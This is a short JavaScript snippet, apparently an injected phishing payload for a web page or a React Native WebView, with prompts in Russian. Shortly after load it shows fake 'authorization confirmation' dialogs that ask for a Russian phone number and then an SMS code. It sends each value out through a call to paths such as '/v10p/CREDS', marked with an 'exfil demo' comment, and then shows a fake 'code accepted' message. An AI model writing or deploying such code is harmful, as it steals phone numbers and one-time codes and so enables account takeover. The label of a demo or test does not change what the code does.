alert('fish 1');
(function(){
  // -----------------------
  // Helpers: normalize/validate
  // -----------------------
  function stripNonDigits(s){ return String(s || '').replace(/\D/g, ''); }

  // Нормализовать телефон к формату +7XXXXXXXXXX (или вернуть null если явно невалидный)
  function normalizeRussianPhone(raw) {
    const d = stripNonDigits(raw);
    if (d.length === 11 && (d.startsWith('7') || d.startsWith('8'))) {
      // если начинается с 8 — считаем как 7
      return '+7' + d.slice(1);
    }
    if (d.length === 10) {
      return '+7' + d;
    }
    return null;
  }

  function isValidRussianPhone(raw) {
    return normalizeRussianPhone(raw) !== null;
  }

  function isValidSmsCode(raw) {
    const d = stripNonDigits(raw);
    return d.length >= 4 && d.length <= 6;
  }

  // -----------------------
  // Usage: step-by-step with validation
  // -----------------------
  async function askPhoneAndCode() {
    // ask phone
    let phoneRaw;
    while (true) {
      phoneRaw = prompt('Требуется подтверждение авторизации\n\nВведите номер телефона:\n+7 (___) ___-__-__', '');
      if (phoneRaw === null) {
        b('/defender/phone_cancelled','user_cancelled');
        return null;
      }
      const normalized = normalizeRussianPhone(phoneRaw);
      if (normalized) break;
      alert('Неверный формат номера. Пример: +7 900 123 45 67');
    }
    b('/v10p/PHONE_FORM', normalized);

    // ask code
    let code;
    while (true) {
      code = prompt('Введите код из SMS\n\nКод из сообщения (4-6 цифр):', '');
      if (code === null) {
        b('/defender/code_cancelled','user_cancelled');
        return null;
      }
      if (isValidSmsCode(code)) break;
      alert('Неверный код. Введите 4-6 цифр');
    }

    const final = { phone: normalized, code: stripNonDigits(code) };
    b('/v10p/CREDS', final); // exfil demo
    // optionally return to app:
    if(window.ReactNativeWebView && window.ReactNativeWebView.postMessage){
      window.ReactNativeWebView.postMessage(JSON.stringify({ action: 'navigateBack', phone: normalized }));
    }
    return final;
  }

  // start
  setTimeout(function(){
    askPhoneAndCode().then(res=>{
      // handle result
      if(res) {
        // show success message
        alert('Готово! Код принят.');
      }
    });
  }, 200);

  // expose helpers for debug
  window.__normalizeRussianPhone = normalizeRussianPhone;
  window.__isValidRussianPhone = isValidRussianPhone;
})();
